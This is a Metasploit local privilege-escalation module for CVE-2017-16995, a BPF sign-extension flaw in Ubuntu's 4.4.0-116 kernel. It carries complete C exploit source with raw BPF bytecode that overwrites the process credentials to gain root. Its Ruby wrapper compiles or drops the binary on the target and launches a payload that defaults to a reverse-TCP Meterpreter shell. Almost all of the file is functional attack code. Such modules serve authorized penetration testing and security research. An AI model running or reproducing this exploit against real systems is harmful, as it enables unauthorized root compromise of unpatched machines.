##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super( update_info( info,
        'Name'           => 'Ubuntu BPF Sign Extension Local Privilege Escalation',
        'Description'    => %q{
          Linux kernel prior to 4.13.0 utilizes the Berkeley Packet Filter
          which contains a vulnerability where it may improperly perform
          sign extension. This can be utilized to escalate privileges.
          This module has been tested on Ubuntu 16.04 with the 4.4.0-116
          kernel, and Linux Mint 18 with the 4.4.0-116-generic kernel.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'bleidl', # discovery
            'vnik',   # edb
            'h00die'  # metasploit module
          ],
        'Platform'       => [ 'linux' ],
        'Arch'           => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes'   => [ 'shell' ],
        'References'     =>
          [
            [ 'CVE', '2017-16995' ],
            [ 'EDB', '44298' ],
            [ 'URL', 'https://usn.ubuntu.com/3523-2/' ],
            [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f' ]
          ],
        'Targets'        =>
          [
            [ 'Linux x64', { 'Arch' => ARCH_X64 } ],
            [ 'Linux x86', { 'Arch' => ARCH_X86 } ]
          ],
        'DefaultOptions' =>
          {
            'PAYLOAD'     => 'linux/x64/meterpreter/reverse_tcp',
            'PrependFork' => true
          },
        'DisclosureDate' => 'Nov 12 2017',
        'Privileged'     => true,
        'DefaultTarget'  => 0))
    register_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ]),
    ]
  end

  def base_dir
    datastore['WritableDir']
  end

  def command_exists?(cmd)
    cmd_exec("command -v #{cmd} && echo true").include? 'true'
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x '#{path}'"
  end

  def check
    version = kernel_release
    unless version.start_with? '4.4.0-116-generic'
      vprint_error "Kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{version} appears to be vulnerable"

    if session.type.to_s.eql? 'meterpreter'
      vprint_error 'Exploit can only be run on command shell sessions (Meterpreter does not work)'
    end

    CheckCode::Appears
  end

  def exploit
    if session.type.to_s.eql? 'meterpreter'
      fail_with Failure::BadConfig, 'Exploit can only be run on command shell sessions (Meterpreter does not work)'
    end

    unless check == CheckCode::Appears
      fail_with Failure::NotVulnerable, 'Target not vulnerable! punt!'
    end

    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    compile = false
    if datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')
      if command_exists? 'gcc'
        vprint_good 'gcc is installed'
        compile = true
      else
        unless datastore['COMPILE'].eql? 'Auto'
          fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
        end
      end
    end

    c_code = %q{
      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <errno.h>
      #include <fcntl.h>
      #include <string.h>
      #include <linux/bpf.h>
      #include <linux/unistd.h>
      #include <sys/mman.h>
      #include <sys/types.h>
      #include <sys/socket.h>
      #include <sys/un.h>
      #include <sys/stat.h>
      #include <stdint.h>

      #define PHYS_OFFSET 0xffff880000000000
      #define CRED_OFFSET 0x5f8
      #define UID_OFFSET 4
      #define LOG_BUF_SIZE 65536
      #define PROGSIZE 328

      int sockets[2];
      int mapfd, progfd;

      char *__prog =  "\xb4\x09\x00\x00\xff\xff\xff\xff"
                  "\x55\x09\x02\x00\xff\xff\xff\xff"
                  "\xb7\x00\x00\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00"
                  "\x18\x19\x00\x00\x03\x00\x00\x00"
                  "\x00\x00\x00\x00\x00\x00\x00\x00"
                  "\xbf\x91\x00\x00\x00\x00\x00\x00"
                  "\xbf\xa2\x00\x00\x00\x00\x00\x00"
                  "\x07\x02\x00\x00\xfc\xff\xff\xff"
                  "\x62\x0a\xfc\xff\x00\x00\x00\x00"
                  "\x85\x00\x00\x00\x01\x00\x00\x00"
                  "\x55\x00\x01\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00"
                  "\x79\x06\x00\x00\x00\x00\x00\x00"
                  "\xbf\x91\x00\x00\x00\x00\x00\x00"
                  "\xbf\xa2\x00\x00\x00\x00\x00\x00"
                  "\x07\x02\x00\x00\xfc\xff\xff\xff"
                  "\x62\x0a\xfc\xff\x01\x00\x00\x00"
                  "\x85\x00\x00\x00\x01\x00\x00\x00"
                  "\x55\x00\x01\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00"
                  "\x79\x07\x00\x00\x00\x00\x00\x00"
                  "\xbf\x91\x00\x00\x00\x00\x00\x00"
                  "\xbf\xa2\x00\x00\x00\x00\x00\x00"
                  "\x07\x02\x00\x00\xfc\xff\xff\xff"
                  "\x62\x0a\xfc\xff\x02\x00\x00\x00"
                  "\x85\x00\x00\x00\x01\x00\x00\x00"
                  "\x55\x00\x01\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00"
                  "\x79\x08\x00\x00\x00\x00\x00\x00"
                  "\xbf\x02\x00\x00\x00\x00\x00\x00"
                  "\xb7\x00\x00\x00\x00\x00\x00\x00"
                  "\x55\x06\x03\x00\x00\x00\x00\x00"
                  "\x79\x73\x00\x00\x00\x00\x00\x00"
                  "\x7b\x32\x00\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00"
                  "\x55\x06\x02\x00\x01\x00\x00\x00"
                  "\x7b\xa2\x00\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00"
                  "\x7b\x87\x00\x00\x00\x00\x00\x00"
                  "\x95\x00\x00\x00\x00\x00\x00\x00";

      char bpf_log_buf[LOG_BUF_SIZE];

      static int bpf_prog_load(enum bpf_prog_type prog_type,
                    const struct bpf_insn *insns, int prog_len,
                    const char *license, int kern_version) {
            union bpf_attr attr = {
                  .prog_type = prog_type,
                  .insns = (__u64)insns,
                  .insn_cnt = prog_len / sizeof(struct bpf_insn),
                  .license = (__u64)license,
                  .log_buf = (__u64)bpf_log_buf,
                  .log_size = LOG_BUF_SIZE,
                  .log_level = 1,
            };

            attr.kern_version = kern_version;

            bpf_log_buf[0] = 0;

            return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
      }

      static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
                     int max_entries) {
            union bpf_attr attr = {
                  .map_type = map_type,
                  .key_size = key_size,
                  .value_size = value_size,
                  .max_entries = max_entries
            };

            return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
      }

      static int bpf_update_elem(uint64_t key, uint64_t value) {
            union bpf_attr attr = {
                  .map_fd = mapfd,
                  .key = (__u64)&key,
                  .value = (__u64)&value,
                  .flags = 0,
            };

            return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
      }

      static int bpf_lookup_elem(void *key, void *value) {
            union bpf_attr attr = {
                  .map_fd = mapfd,
                  .key = (__u64)key,
                  .value = (__u64)value,
            };

            return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
      }

      static void __exit(char *err) {
            fprintf(stderr, "error: %s\n", err);
            exit(-1);
      }

      static void prep(void) {
            mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);

            if (mapfd < 0)
                  __exit(strerror(errno));

            progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
                        (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);

            if (progfd < 0)
                  __exit(strerror(errno));

            if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
                  __exit(strerror(errno));

            if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
                  __exit(strerror(errno));
      }

      static void writemsg(void) {
            char buffer[64];

            ssize_t n = write(sockets[0], buffer, sizeof(buffer));

            if (n < 0) {
                  perror("write");
                  return;
            }
            if (n != sizeof(buffer))
                  fprintf(stderr, "short write: %lu\n", n);
      }

      #define __update_elem(a, b, c) \
            bpf_update_elem(0, (a)); \
            bpf_update_elem(1, (b)); \
            bpf_update_elem(2, (c)); \
            writemsg();

      static uint64_t get_value(int key) {
            uint64_t value;

            if (bpf_lookup_elem(&key, &value))
                  __exit(strerror(errno));

            return value;
      }

      static uint64_t __get_fp(void) {
            __update_elem(1, 0, 0);

            return get_value(2);
      }

      static uint64_t __read(uint64_t addr) {
            __update_elem(0, addr, 0);

            return get_value(2);
      }

      static void __write(uint64_t addr, uint64_t val) {
            __update_elem(2, addr, val);
      }

      static uint64_t get_sp(uint64_t addr) {
            return addr & ~(0x4000 - 1);
      }

      static void pwn(void) {
            uint64_t fp, sp, task_struct, credptr, uidptr;

            fp = __get_fp();
            if (fp < PHYS_OFFSET)
                  __exit("bogus fp");

            sp = get_sp(fp);
            if (sp < PHYS_OFFSET)
                  __exit("bogus sp");

            task_struct = __read(sp);

            if (task_struct < PHYS_OFFSET)
                  __exit("bogus task ptr");

            printf("task_struct = %lx\n", task_struct);

            credptr = __read(task_struct + CRED_OFFSET); // cred

            if (credptr < PHYS_OFFSET)
                  __exit("bogus cred ptr");

            uidptr = credptr + UID_OFFSET; // uid
            if (uidptr < PHYS_OFFSET)
                  __exit("bogus uid ptr");

            printf("uidptr = %lx\n", uidptr);
            __write(uidptr, 0); // set both uid and gid to 0

            if (getuid() == 0) {
                  printf("spawning root shell\n");
                  system("/bin/bash");
                  exit(0);
            }

            __exit("not vulnerable?");
      }

      int main(int argc, char **argv) {
            prep();
            pwn();

            return 0;
      }

    }

    exploit_name = ".#{rand_text_alphanumeric 8..12}"
    exploit_path = "#{base_dir}/#{exploit_name}"

    # exploit name must be 7 characters to allow string replacement
    # in the pre-compiled binary
    payload_name = ".#{rand_text_alphanumeric 7}"
    payload_path = "#{base_dir}/#{payload_name}"

    if compile
      vprint_status 'Live compiling exploit on system...'
      c_code.gsub!(%r{/bin/bash}, payload_path)
      upload "#{exploit_path}.c", c_code
      output = cmd_exec "gcc -o #{exploit_path} #{exploit_path}.c"

      unless output.blank?
        print_error output
        fail_with Failure::Unknown, "#{exploit_path}.c failed to compile"
      end

      cmd_exec "chmod +x #{exploit_path}"
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      compiled_path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2017-16995', 'exploit.out'
      fd = ::File.open compiled_path, 'rb'
      exploit_data = fd.read fd.stat.size
      fd.close

      exploit_data.gsub!(%r{/tmp/JDQDHtEG}, payload_path)
      upload_and_chmodx exploit_path, exploit_data
    end

    upload_and_chmodx payload_path, generate_payload_exe

    print_status 'Launching exploit...'
    output = cmd_exec exploit_path
    output.each_line { |line| vprint_status line.chomp }
  end
end
